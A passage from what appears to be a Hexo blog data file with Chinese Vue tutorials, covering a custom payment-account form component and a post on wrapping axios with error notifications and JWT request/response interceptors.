class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">a-input-group</span> <span class=\"attr\">compact</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a-select</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 130px;\"</span> <span class=\"attr\">v-model</span>=<span class=\"string\">\"type\"</span> @<span class=\"attr\">change</span>=<span class=\"string\">\"handleTypeChange\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-select-option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"aplipay\"</span>&gt;</span>支付宝<span class=\"tag\">&lt;/<span class=\"name\">a-select-option</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-select-option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"bank\"</span>&gt;</span>银行账户<span class=\"tag\">&lt;/<span class=\"name\">a-select-option</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a-select</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a-input</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">style</span>=<span class=\"string\">\"width: calc(100% - 130px)\"</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">v-model</span>=<span class=\"string\">\"number\"</span></span></span><br><span class=\"line\"><span class=\"tag\">      @<span class=\"attr\">change</span>=<span class=\"string\">\"handleNumberChange\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">a-input-group</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    props: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      value: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        type: <span class=\"built_in\">Object</span></span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    watch: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      value(val) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"built_in\">Object</span>.assign(<span class=\"keyword\">this</span>, val);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">const</span> &#123; type, number &#125; = <span class=\"keyword\">this</span>.value || &#123;&#125;;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        type: type || <span class=\"string\">\"aplipay\"</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">        number: number || <span class=\"string\">\"\"</span></span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    methods: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      handleTypeChange(val) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.$emit(<span class=\"string\">\"change\"</span>, &#123; ...this.value, <span class=\"attr\">type</span>: val &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">      handleNumberChange(e) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.$emit(<span class=\"string\">\"change\"</span>, &#123; ...this.value, <span class=\"attr\">number</span>: e.target.value &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"使用自定义组件-ReceiverAccount\"><a href=\"#使用自定义组件-ReceiverAccount\" class=\"headerlink\" title=\"使用自定义组件 ReceiverAccount\"></a>使用自定义组件 ReceiverAccount</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a-form</span> <span class=\"attr\">:form</span>=<span class=\"string\">\"form\"</span> <span class=\"attr\">layout</span>=<span class=\"string\">\"horizontal\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-form-item</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">label</span>=<span class=\"string\">\"付款账户\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">:label-col</span>=<span class=\"string\">\"formItemLayout.labelCol\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">:wrapper-col</span>=<span class=\"string\">\"formItemLayout.wrapperCol\"</span></span></span><br><span class=\"line\"><span class=\"tag\">      &gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a-input</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">v-decorator</span>=<span class=\"string\">\"[</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">            'payAccount', </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">            &#123;</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">              initialValue: step.payAccount,</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">              rules: [&#123;required: true, message: '请输入付款账号'&#125;]</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">            &#125;</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">          ]\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-form-item</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">label</span>=<span class=\"string\">\"收款账户\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">:label-col</span>=<span class=\"string\">\"formItemLayout.labelCol\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">:wrapper-col</span>=<span class=\"string\">\"formItemLayout.wrapperCol\"</span></span></span><br><span class=\"line\"><span class=\"tag\">      &gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ReceiverAccount</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">v-decorator</span>=<span class=\"string\">\"[</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">            'receiverAccount', </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">            &#123;</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">              initialValue: step.receiverAccount,</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">              rules: [&#123;required: true, message: '请输入收款账号', validator: checkReceiverAccount&#125;]</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">            &#125;</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">          ]\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a-button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"primary\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"handleSubmit\"</span>&gt;</span></span><br><span class=\"line\">          下一步</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">a-button</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a-form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> ReceiverAccount <span class=\"keyword\">from</span> <span class=\"string\">\"@/components/ReceiverAccount\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    components: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      ReceiverAccount</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        formItemLayout: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          labelCol: &#123; span: 4 &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">          wrapperCol: &#123; span: 14 &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">        form: <span class=\"keyword\">this</span>.$form.createForm(<span class=\"keyword\">this</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    computed: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      step() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.$store.state.form.step;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    methods: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      handleSubmit() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">const</span> &#123; form, $router, $store &#125; = <span class=\"keyword\">this</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        form.validateFields(<span class=\"function\">(<span class=\"params\">err, values</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">if</span> (!err) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            $store.commit(<span class=\"string\">\"form/saveStepFormData\"</span>, values);</span></span><br><span class=\"line\"><span class=\"javascript\">            $router.push(<span class=\"string\">\"/form/step-form/confirm\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">          &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">      checkReceiverAccount(rule, value, callback) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">if</span> (value &amp;&amp; value.number) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          callback();</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          callback(<span class=\"literal\">false</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>"},{"title":"Vue实战@axios二次封装","date":"2019-05-22T13:02:59.000Z","updated":"2019-05-22T13:02:59.000Z","_content":"\n# 概述\n\naxios 二次封装的相关总结。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 基础实现\n\n之所以需要二次封装，因为正常情况下，我们会针对错误之类的作统一处理，除了错误还有请求头，url 等，详细可参考 axios [官方文档](http://www.axios-js.com/)。\n\n```js\n// utils>request.js\nimport axios from \"axios\";\nimport { notification } from \"ant-design-vue\";\n\nfunction request(options) {\n  return axios(options)\n    .then(res => {\n      return res;\n    })\n    .catch(error => {\n      const {\n        response: { status, statusText }\n      } = error;\n      notification.error({\n        // jsx语法美化提示信息展示样式\n        message: h => (\n          <div>\n            请求错误 <span style=\"color: red\">{status}</span> : {options.url}\n          </div>\n        ),\n        description: statusText\n      });\n      return Promise.reject(error);\n    });\n}\n\nexport default request;\n```\n\n## 特别提示\n\n示例中 notification 的 message 部分使用了 jsx 语法，有关 vue 中使用 jsx 的方法如下：\n\n1. 首先需要安装`@vue/babel-preset-jsx`和`@vue/babel-helper-vue-jsx-merge-props`；\n2. 然后修改 babel 配置`presets: [\"@vue/app\", \"@vue/babel-preset-jsx\"],`；\n3. 最后在 vue 组件中使用，如上示例代码 message 部分。\n\n## 进阶实现\n\n以下是摘自[奇舞周刊](https://mp.weixin.qq.com/s/eqgf9MLEcLrooBhzgCVV6A)公众号。\n\n```js\nimport axios from \"axios\";\nimport router from \"../router\";\nimport { MessageBox, Message } from \"element-ui\";\nlet loginUrl = \"/login\";\n// 根据环境切换接口地址\naxios.defaults.baseURL = process.env.VUE_APP_API;\naxios.defaults.headers = { \"X-Requested-With\": \"XMLHttpRequest\" };\naxios.defaults.timeout = 60000;\n// 请求拦截器\naxios.interceptors.request.use(\n  config => {\n    if (router.history.current.path !== loginUrl) {\n      let token = window.sessionStorage.getItem(\"token\");\n      if (token == null) {\n        router.replace({\n          path: loginUrl,\n          query: { redirect: router.currentRoute.fullPath }\n        });\n        return false;\n      } else {\n        config.headers[\"Authorization\"] = \"JWT \" + token;\n      }\n    }\n    return config;\n  },\n  error => {\n    Message.warning(error);\n    return Promise.reject(error);\n  }\n);\n// 响应拦截器\naxios.interceptors.response.use(\n  response => {\n    return response.data;\n  },\n  error => {\n    if (error.response !== undefined) {\n      switch (error.response.status) {\n        case 400:\n          MessageBox.alert(error.response.data);\n          break;\n        case 401:\n          if (window.sessionStorage.getItem(\"out\") === null) {\n            window.sessionStorage.setItem(\"out\", 1);\n            MessageBox.confirm(\"会话已失效! 请重新登录\", \"提示\", {\n              confirmButtonText: \"重新登录\",\n              cancelButtonText: \"取消\",\n              type: \"warning\"\n            })\n              .then(() => {\n                router.replace({\n                  path: loginUrl,\n                  query: { redirect: router.currentRoute.fullPath }\n                });\n              })\n              .catch(action => {\n                window.sessionStorage.clear();\n                window.localStorage.clear();\n              });\n          }\n          break;\n        case 402:\n          MessageBox.confirm(\"登陆超时 ！\", \"提示\", {\n            confirmButtonText: \"重新登录\",\n            cancelButtonText: \"取消\",\n            type: \"warning\"\n          }).then(() => {\n            router.replace({\n              path: loginUrl,\n              query: { redirect: router.currentRoute.fullPath }\n            });\n          });\n          break;\n        case 403:\n          MessageBox.alert(\"没有权限！\");\n          break;\n        // ...忽略\n        default:\n          MessageBox.alert(`连接错误${error.response.status}`);\n      }\n      return Promise.resolve(error.response);\n    }\n    return Promise.resolve(error);\n  }\n);\n// 导出基础请求类型封装\nexport default {\n  get(url, param) {\n    if (param !== undefined) {\n      Object.assign(param, { _t: new Date().getTime() });\n    } else {\n      param = { _t: new Date().getTime() };\n    }\n    return new Promise((resolve, reject) => {\n      axios({ method: \"get\", url, params: param }).then(res => {\n        resolve(res);\n      });\n    });\n  },\n  getData(url, param) {\n    return new Promise((resolve, reject) => {\n      axios({ method: \"get\", url, params: param }).then(res => {\n        if (res.code === 4000) {\n          resolve(res.data);\n        } else {\n          Message.warning(res.msg);\n        }\n      });\n    });\n  },\n  post(url, param, config) {\n    return new Promise((resolve, reject) => {\n      axios.post(url, param, config).then(res => {\n        resolve(res);\n      });\n    });\n  },\n  put: axios.put,\n  _delete: axios.delete\n};\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n\n奇舞周刊\n","source":"_posts/2019/05/vue-in-action-axios.md","raw":"---\ntitle: Vue实战@axios二次封装\npermalink: vue-in-action-axios\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-22 21:02:59\nupdated: 2019-05-22 21:02:59\n---\n\n# 概述\n\naxios 二次封装的相关总结。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 基础实现\n\n之所以需要二次封装，因为正常情况下，我们会针对错误之类的作统一处理，除了错误还有请求头，url 等，详细可参考 axios [官方文档](http://www.axios-js.com/)。\n\n```js\n// utils>request.js\nimport axios from \"axios\";\nimport { notification } from \"ant-design-vue\";\n\nfunction request(options) {\n  return axios(options)\n    .then(res => {\n      return res;\n    })\n    .catch(error => {\n      const {\n        response: { status, statusText }\n      } = error;\n      notification.error({\n        // jsx语法美化提示信息展示样式\n        message: h => (\n          <div>\n            请求错误 <span style=\"color: red\">{status}</span> : {options.url}\n          </div>\n        ),\n        description: statusText\n      });\n      return Promise.reject(error);\n    });\n}\n\nexport default request;\n```\n\n## 特别提示\n\n示例中 notification 的 message 部分使用了 jsx 语法，有关 vue 中使用 jsx 的方法如下：\n\n1. 首先需要安装`@vue/babel-preset-jsx`和`@vue/babel-helper-vue-jsx-merge-props`；\n2. 然后修改 babel 配置`presets: [\"@vue/app\", \"@vue/babel-preset-jsx\"],`；\n3. 最后在 vue 组件中使用，如上示例代码 message 部分。\n\n## 进阶实现\n\n以下是摘自[奇舞周刊](https://mp.weixin.qq.com/s/eqgf9MLEcLrooBhzgCVV6A)公众号。\n\n```js\nimport axios from \"axios\";\nimport router from \"../router\";\nimport { MessageBox, Message } from \"element-ui\";\nlet loginUrl = \"/login\";\n// 根据环境切换接口地址\naxios.defaults.baseURL = process.env.VUE_APP_API;\naxios.defaults.headers = { \"X-Requested-With\": \"XMLHttpRequest\" };\naxios.defaults.timeout = 60000;\n// 请求拦截器\naxios.interceptors.request.use(\n  config => {\n    if (router.history.current.path !== loginUrl) {\n      let token = window.sessionStorage.getItem(\"token\");\n      if (token == null) {\n        router.replace({\n          path: loginUrl,\n          query: { redirect: router.currentRoute.fullPath }\n        });\n        return false;\n      } else {\n        config.headers[\"Authorization\"] = \"JWT \" + token;\n      }\n    }\n    return config;\n  },\n  error => {\n    Message.warning(error);\n    return Promise.reject(error);\n  }\n);\n// 响应拦截器\naxios.interceptors.response.use(\n  response => {\n    return response.data;\n  },\n  error => {\n    if (error.response !== undefined) {\n      switch (error.response.status) {\n        case 400:\n          MessageBox.alert(error.response.data);\n          break;\n        case 401:\n          if (window.sessionStorage.getItem(\"out\") === null) {\n            window.sessionStorage.setItem(\"out\", 1);\n            MessageBox.confirm(\"会话已失效! 请重新登录\", \"提示\", {\n              confirmButtonText: \"重新登录\",\n              cancelButtonText: \"取消\",\n              type: \"warning\"\n            })\n              .then(() => {\n                router.replace({\n                  path: loginUrl,\n                  query: { redirect: router.currentRoute.fullPath }\n                });\n              })\n              .catch(action => {\n                window.sessionStorage.clear();\n                window.localStorage.clear();\n              });\n          }\n          break;\n        case 402:\n          MessageBox.confirm(\"登陆超时 ！\", \"提示\", {\n            confirmButtonText: \"重新登录\",\n            cancelButtonText: \"取消\",\n            type: \"warning\"\n          }).then(() => {\n            router.replace({\n              path: loginUrl,\n              query: { redirect: router.currentRoute.fullPath }\n            });\n          });\n          break;\n        case 403:\n          MessageBox.alert(\"没有权限！\");\n          break;\n        // ...忽略\n        default:\n          MessageBox.alert(`连接错误${error.response.status}`);\n      }\n      return Promise.resolve(error.response);\n    }\n    return Promise.resolve(error);\n  }\n);\n// 导出基础请求类型封装\nexport default {\n  get(url, param) {\n    if (param !== undefined) {\n      Object.assign(param, { _t: new Date().getTime() });\n    } else {\n      param = { _t: new Date().getTime() };\n    }\n    return new Promise((resolve, reject) => {\n      axios({ method: \"get\", url, params: param }).then(res => {\n        resolve(res);\n      });\n    });\n  },\n  getData(url, param) {\n    return new Promise((resolve, reject) => {\n      axios({ method: \"get\", url, params: param }).then(res => {\n        if (res.code === 4000) {\n          resolve(res.data);\n        } else {\n          Message.warning(res.msg);\n        }\n      });\n    });\n  },\n  post(url, param, config) {\n    return new Promise((resolve, reject) => {\n      axios.post(url, param, config).then(res => {\n        resolve(res);\n      });\n    });\n  },\n  put: axios.put,\n  _delete: axios.delete\n};\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n\n奇舞周刊\n","slug":"vue-in-action-axios","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xn006lwovvjfnpbbeh","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>axios 二次封装的相关总结。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"基础实现\"><a href=\"#基础实现\" class=\"headerlink\" title=\"基础实现\"></a>基础实现</h2><p>之所以需要二次封装，因为正常情况下，我们会针对错误之类的作统一处理，除了错误还有请求头，url 等，详细可参考 axios <a href=\"http://www.axios-js.com/\" target=\"_blank\" rel=\"noopener\">官方文档</a>。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// utils&gt;request.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> axios <span class=\"keyword\">from</span> <span class=\"string\">\"axios\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; notification &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">request</span>(<span class=\"params\">options</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> axios(options)</span><br><span class=\"line\">    .then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    .catch(<span class=\"function\"><span class=\"params\">error</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> &#123;</span><br><span class=\"line\">        response: &#123; status, statusText &#125;</span><br><span class=\"line\">      &#125; = error;</span><br><span class=\"line\">      notification.error(&#123;</span><br><span class=\"line\">        <span class=\"comment\">// jsx语法美化提示信息展示样式</span></span><br><span class=\"line\">        message: <span class=\"function\"><span class=\"params\">h</span> =&gt;</span> (</span><br><span class=\"line\">          &lt;div&gt;</span><br><span class=\"line\">            请求错误 &lt;span style=<span class=\"string\">\"color: red\"</span>&gt;&#123;status&#125;&lt;<span class=\"regexp\">/span&gt; : &#123;options.url&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;/</span>div&gt;</span><br><span class=\"line\">        ),</span><br><span class=\"line\">        description: statusText</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.reject(error);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> request;</span><br></pre></td></tr></table></figure>\n<h2 id=\"特别提示\"><a href=\"#特别提示\" class=\"headerlink\" title=\"特别提示\"></a>特别提示</h2><p>示例中 notification 的 message 部分使用了 jsx 语法，有关 vue 中使用 jsx 的方法如下：</p>\n<ol>\n<li>首先需要安装<code>@vue/babel-preset-jsx</code>和<code>@vue/babel-helper-vue-jsx-merge-props</code>；</li>\n<li>然后修改 babel 配置<code>presets: [&quot;@vue/app&quot;, &quot;@vue/babel-preset-jsx&quot;],</code>；</li>\n<li>最后在 vue 组件中使用，如上示例代码 message 部分。</li>\n</ol>\n<h2 id=\"进阶实现\"><a href=\"#进阶实现\" class=\"headerlink\" title=\"进阶实现\"></a>进阶实现</h2><p>以下是摘自<a href=\"https://mp.weixin.qq.com/s/eqgf9MLEcLrooBhzgCVV6A\" target=\"_blank\" rel=\"noopener\">奇舞周刊</a>公众号。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span 